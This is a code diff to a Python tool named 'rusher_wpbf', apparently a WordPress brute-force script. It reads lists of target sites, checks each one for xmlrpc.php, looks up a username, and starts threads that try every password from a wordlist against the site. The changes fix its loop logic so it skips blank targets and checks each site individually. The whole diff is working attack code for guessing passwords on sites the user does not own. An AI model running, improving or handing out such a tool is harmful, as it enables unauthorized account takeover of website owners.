@@ -99,37 +99,39 @@ class rusher_wpbf:
 
             for target in open(args.target, errors="ignore").read().split("\n"):
 
-                user = self.get_user(target)
+                if target != '':
 
-                if os.path.isfile(args.wordlist):
+                    if os.path.isfile(args.wordlist):
 
-                    if self.check_xmlrpc(args.target):
+                        if self.check_xmlrpc(target):
 
-                        for x in open(args.wordlist, errors="ignore").read().split("\n"):
+                            user = self.get_user(target)
 
-                            if x != '':
+                            for x in open(args.wordlist, errors="ignore").read().split("\n"):
 
-                                t = Thread(target=self.req, args=(target, user, x))
-                                t.daemon = True
-                                t.start()
-                                delay(0.1)
+                                if x != '':
+
+                                    t = Thread(target=self.req, args=(target, user, x))
+                                    t.daemon = True
+                                    t.start()
+                                    delay(0.1)
+
+                        else:
+
+                            print("[-] Not found xmlrpc.php")
+                            continue
 
                     else:
 
-                        print("[-] Not found xmlrpc.php")
-                        continue
-
-                else:
-
-                    print("[-] Not found ( {} )".format(args.wordlist))
+                        print("[-] Not found ( {} )".format(args.wordlist))
 
         else:
 
             if os.path.isfile(args.wordlist):
 
-                user = self.get_user(args.target)
-
                 if self.check_xmlrpc(args.target):
+
+                    user = self.get_user(args.target)
 
                     for x in open(args.wordlist, errors="ignore").read().split("\n"):
 
